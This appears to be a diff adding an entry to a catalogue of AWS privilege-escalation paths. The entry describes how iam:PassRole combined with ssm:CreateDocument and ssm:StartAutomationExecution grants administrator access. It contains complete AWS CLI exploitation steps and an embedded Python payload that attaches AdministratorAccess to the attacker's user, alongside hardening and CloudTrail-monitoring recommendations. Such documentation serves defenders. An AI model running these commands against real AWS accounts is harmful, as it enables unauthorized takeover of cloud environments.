@@ -1,0 +1,265 @@
+id: ssm-003
+name: iam:PassRole + ssm:CreateDocument + ssm:StartAutomationExecution
+category: new-passrole
+services:
+  - iam
+  - ssm
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM role to the SSM Automation service as the AutomationAssumeRole
+    - permission: ssm:CreateDocument
+      resourceConstraints: No resource constraints required
+    - permission: ssm:StartAutomationExecution
+      resourceConstraints: No resource constraints required
+  additional:
+    - permission: ssm:DescribeAutomationExecutions
+      resourceConstraints: Useful for listing and monitoring automation executions
+    - permission: ssm:GetAutomationExecution
+      resourceConstraints: Useful for polling execution status and retrieving step outputs
+    - permission: ssm:ListDocuments
+      resourceConstraints: Helpful for discovering existing SSM documents and their associated roles
+    - permission: ssm:DescribeDocument
+      resourceConstraints: Useful for inspecting document content before execution
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole`, `ssm:CreateDocument`, and `ssm:StartAutomationExecution` can escalate privileges by creating a custom SSM Automation document with a Python `aws:executeScript` step that calls `iam:AttachUserPolicy`, then starting an execution that passes an admin IAM role as the `AutomationAssumeRole`. SSM Automation runs the Python script in AWS-managed serverless compute under the admin role's credentials — no EC2 instance, SSM agent, or intermediate infrastructure is required. The script attaches AdministratorAccess to the starting user.
+
+prerequisites:
+  admin:
+    - A role must exist that trusts ssm.amazonaws.com to assume it
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - A role must exist that trusts ssm.amazonaws.com and has elevated permissions
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        cat > /tmp/ssm-privesc-doc.json << 'EOF'
+        {
+          "schemaVersion": "0.3",
+          "description": "Privilege escalation via SSM Automation aws:executeScript",
+          "assumeRole": "{{ AutomationAssumeRole }}",
+          "parameters": {
+            "AutomationAssumeRole": {
+              "type": "String",
+              "description": "Admin IAM role ARN for SSM Automation to assume"
+            },
+            "UserName": {
+              "type": "String",
+              "description": "IAM user name to escalate"
+            }
+          },
+          "mainSteps": [
+            {
+              "name": "escalateUser",
+              "action": "aws:executeScript",
+              "inputs": {
+                "Runtime": "python3.11",
+                "Handler": "script_handler",
+                "InputPayload": {
+                  "UserName": "{{ UserName }}"
+                },
+                "Script": "import boto3\ndef script_handler(events, context):\n    iam = boto3.client('iam')\n    iam.attach_user_policy(\n        UserName=events['UserName'],\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    return {'Status': 'Escalated ' + events['UserName']}\n"
+              }
+            }
+          ]
+        }
+        EOF
+
+        aws ssm create-document \
+          --name privesc-ssm-doc \
+          --content file:///tmp/ssm-privesc-doc.json \
+          --document-type Automation \
+          --document-format JSON
+      description: Create a custom SSM Automation document with schema version 0.3. The document contains an aws:executeScript step with embedded Python that calls iam:AttachUserPolicy using the AutomationAssumeRole's credentials. The assumeRole field at the document level ensures all steps run under the passed admin role.
+    - step: 2
+      command: |
+        aws ssm start-automation-execution \
+          --document-name privesc-ssm-doc \
+          --parameters '{
+            "AutomationAssumeRole": ["arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE"],
+            "UserName": ["STARTING_USER"]
+          }'
+      description: Start the automation execution, passing the admin role as AutomationAssumeRole via iam:PassRole. SSM assumes the role and runs the Python aws:executeScript step in AWS-managed serverless compute — no EC2 instance or SSM agent is required.
+    - step: 3
+      command: |
+        aws ssm get-automation-execution \
+          --automation-execution-id EXECUTION_ID \
+          --query 'AutomationExecution.AutomationExecutionStatus' \
+          --output text
+      description: Poll the automation execution status until it reaches Success. The Python step typically completes within 30-90 seconds.
+    - step: 4
+      command: |
+        aws iam list-attached-user-policies \
+          --user-name STARTING_USER
+      description: Verify that AdministratorAccess is now attached to the starting user, confirming privilege escalation success.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative SSM Automation roles** - Very rarely does an SSM Automation document need administrative IAM access. Use the principle of least privilege and scope Automation roles to only the specific resources and actions the document legitimately requires.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificAutomationRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ssm.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - **Restrict `ssm:CreateDocument`** - This permission allows creating arbitrary Automation documents with `aws:executeScript` steps that run any Python code under the passed role. Restrict it to trusted infrastructure principals only.
+  - **Restrict `ssm:StartAutomationExecution`** - Starting an automation with a privileged `AutomationAssumeRole` is the point where the `iam:PassRole` is exercised. Use resource-level conditions to restrict which documents and roles can be used.
+  - Monitor CloudTrail for `ssm:CreateDocument` calls with document type `Automation`, especially from principals who don't normally create SSM documents
+  - Monitor CloudTrail for `ssm:StartAutomationExecution` calls that specify a privileged `AutomationAssumeRole`
+  - Monitor CloudTrail for roles being passed to SSM that haven't been used with Automation before
+  - Alert on IAM policy attachment events originating from SSM Automation execution roles
+  - Regularly audit all IAM roles that trust ssm.amazonaws.com and down-scope any with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed AutomationAssumeRole has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks. This is one of the most serverless and infrastructure-free PassRole escalation paths — unlike EC2, Lambda, or Batch, it requires no container image, no function code deployment, no job queue, and no running compute resources beyond the Automation execution itself.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Using scripts in runbooks (aws:executeScript) - AWS Systems Manager (AWS Documentation)"
+    url: "https://docs.aws.amazon.com/systems-manager/latest/userguide/automation-document-script-considerations.html"
+  - title: "Actions defined by AWS Systems Manager - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonsystemsmanager.html"
+  - title: "Setting up Automation - AWS Systems Manager (AWS Documentation)"
+    url: "https://docs.aws.amazon.com/systems-manager/latest/userguide/automation-setup.html"
+
+relatedPaths:
+  - ssm-001
+  - ssm-002
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/ssm-003-ssm-createdocument+ssm-startautomationexecution"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: The principal with `iam:PassRole`, `ssm:CreateDocument`, and `ssm:StartAutomationExecution` permissions. Can be an IAM user or role. This is one of the most infrastructure-free PassRole paths — no EC2, container, or job queue is needed.
+  - id: ssm_document
+    label: SSM Automation Document
+    type: resource
+    description: A custom SSM Automation document (schema version 0.3) created with an `aws:executeScript` step containing embedded Python. The document declares an `AutomationAssumeRole` parameter and references it in the top-level `assumeRole` field, which instructs SSM to assume the passed role for all steps in the execution. No S3 script bucket or external code storage is needed — the Python is embedded inline in the document JSON.
+  - id: admin_role
+    label: Admin Role (AutomationAssumeRole)
+    type: principal
+    description: The IAM role passed as `AutomationAssumeRole` when the automation execution starts. The role must trust `ssm.amazonaws.com`. SSM assumes this role before running any steps, making its credentials available to the `aws:executeScript` Python runtime. The boto3 client in the Python script automatically uses these credentials.
+  - id: python_script
+    label: aws:executeScript (Python)
+    type: payload
+    color: '#99ccff'
+    description: |
+      The embedded Python function that runs in AWS-managed serverless compute under the admin role's credentials. The `aws:executeScript` action type handles all compute provisioning — there is no EC2 instance, Lambda function, or container to manage.
+
+      The script calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user:
+      ```python
+      import boto3
+      def script_handler(events, context):
+          iam = boto3.client('iam')
+          iam.attach_user_policy(
+              UserName=events['UserName'],
+              PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+          )
+          return {'Status': 'Escalated ' + events['UserName']}
+      ```
+
+      The execution is started with:
+      ```bash
+      aws ssm start-automation-execution \
+        --document-name privesc-ssm-doc \
+        --parameters '{
+          "AutomationAssumeRole": ["arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE"],
+          "UserName": ["STARTING_USER"]
+        }'
+      ```
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    description: The passed role has AdministratorAccess or equivalent permissions including `iam:AttachUserPolicy`. The Python script successfully attaches AdministratorAccess to the starting user, granting full administrative access to the AWS account. The execution typically completes within 30-90 seconds.
+  - id: some_perms
+    label: Some additional access
+    type: outcome
+    color: '#ffeb99'
+    description: The passed role has some elevated permissions but lacks IAM write access. The Python script can still perform useful actions — reading S3 data, querying DynamoDB, or accessing other resources — but cannot directly grant the starting principal new permissions. The specific capabilities depend on the role's policy.
+  - id: no_perms
+    label: No additional access
+    type: outcome
+    color: '#cccccc'
+    description: The passed role has only minimal permissions. The Python script cannot perform meaningful escalation or data access. The attack provides limited value despite successfully creating and executing the Automation document.
+  edges:
+  - from: start
+    to: ssm_document
+    label: ssm:CreateDocument
+    description: |
+      Create a custom SSM Automation document with an embedded Python `aws:executeScript` step. The document uses schema version 0.3 and declares the `AutomationAssumeRole` as a parameter, referenced in the top-level `assumeRole` field.
+
+      Command:
+      ```bash
+      aws ssm create-document \
+        --name privesc-ssm-doc \
+        --content file:///tmp/ssm-privesc-doc.json \
+        --document-type Automation \
+        --document-format JSON
+      ```
+
+      The document JSON embeds the Python script inline — no external script storage is required.
+  - from: ssm_document
+    to: admin_role
+    label: iam:PassRole + ssm:StartAutomationExecution
+    description: |
+      Start the automation execution and pass the admin role as the `AutomationAssumeRole` parameter. The `iam:PassRole` action is exercised at this point. SSM assumes the role before running any document steps.
+
+      Command:
+      ```bash
+      aws ssm start-automation-execution \
+        --document-name privesc-ssm-doc \
+        --parameters '{
+          "AutomationAssumeRole": ["arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE"],
+          "UserName": ["STARTING_USER"]
+        }'
+      ```
+  - from: admin_role
+    to: python_script
+    label: SSM runs aws:executeScript under admin role
+    description: SSM Automation provisions AWS-managed serverless compute to run the `aws:executeScript` step. The execution environment automatically receives the admin role's credentials. The boto3 client in the Python handler uses these credentials without any explicit configuration.
+  - from: python_script
+    to: admin
+    label: If passed role has admin permissions
+    branch: A
+    condition: admin
+    description: If the `AutomationAssumeRole` has AdministratorAccess or specific IAM write permissions (such as `iam:AttachUserPolicy`), the Python script successfully attaches AdministratorAccess to the starting user, completing the privilege escalation.
+  - from: python_script
+    to: some_perms
+    label: If passed role has some elevated permissions
+    branch: B
+    condition: some_permissions
+    description: If the `AutomationAssumeRole` has elevated permissions but lacks IAM write access, the Python script can leverage those permissions for data access or reconnaissance, but cannot directly grant the starting principal new permissions.
+  - from: python_script
+    to: no_perms
+    label: If passed role has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: If the `AutomationAssumeRole` has only minimal permissions, the Python script cannot perform meaningful actions. The attack provides limited value despite the execution completing successfully.
